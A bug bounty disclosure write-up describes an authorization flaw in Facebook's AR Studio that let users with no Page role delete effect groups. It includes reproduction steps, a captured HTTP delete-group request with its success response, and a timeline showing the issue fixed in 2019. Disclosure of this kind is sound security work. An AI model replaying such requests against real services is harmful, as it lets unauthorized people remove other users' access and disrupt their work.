---
title: Delete Groups AR Studio Effect
description: Users without page roles could delete AR Studio Effect groups, removing other users and disrupting creators workflows.
date: 2019-03-12 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
Page admins can create groups in AR Studio Effect to allow users to create and manage effects. Members with admin or editor roles in the Page are expected to be able to manage (edit/delete) groups. However, this vulnerability allows users with no page role to delete groupsin AR Studio Effect, removing other users and disrupting group-managed effect workflows.

**Impact:** Unauthorized deletion of groups causes loss of membership, potential removal of collaborators' access to effects, and interruption of production workflows for creators and teams. This is an authorization control failure affecting group integrity and access control.

---

## ⚙️ Steps to Reproduce

**Actors**  
- **UserA** — Admin of `Page_A` (creates group)  
- **UserB** — Regular user added to `group_A` (no page role)  

**Steps**

1. **UserA** visits the AR Studio permissions page:  
   `https://www.facebook.com/arp/settings/permissions/`  
2. **UserA** creates a new group `group_A` and adds members: Rick, Stephen, Armin, Megan, etc.  
3. Members of `group_A` can create and manage AR effects as expected.  
4. **UserB** (who has no role on the Page) sends the following request to the AR Studio group delete endpoint (captured from the web UI/network panel):

### 📤 Request
```http
POST /arp/settings/permissions/delete-group/async/?group_id={ID_group_a} HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

&__user=&__a=1&__dyn=7&__req=e&__be=1&__pc=PHASED%3ADEFAULT&dpr=1&__rev=&fb_dtsg=&jazoest=21971&__spin_r=&__spin_b=trunk&__spin_t=
```

### ✅ Response
```
for (;;);{"__ar":1,"payload":{"success":true},"bootloadable":{},"ixData":{},"bxData":{},"gkxData":{},"qexData":{},"lid":""}
```

5. **UserB** successfully removes all users from `group_A`, including himself, effectively deleting the group and its membership.

**Result:** A non‑admin user (no Page role) can delete AR Studio Effect groups they are a member of, despite not having administrative privileges on the Page — violating expected access controls.

---

### 🧱 Expected Behavior
Only Page admins, or members explicitly granted group admin/editor rights (and validated against Page roles where applicable), should be able to delete or modify AR Studio groups. Users without such privileges must not be able to remove groups or other users.

---

## Timeline

- **Reported:** March 12,2019 
- **Triaged:** March 18,2019 
- **Fixed:** March 21,2019  
- **Reward:** October 26, 2019

---
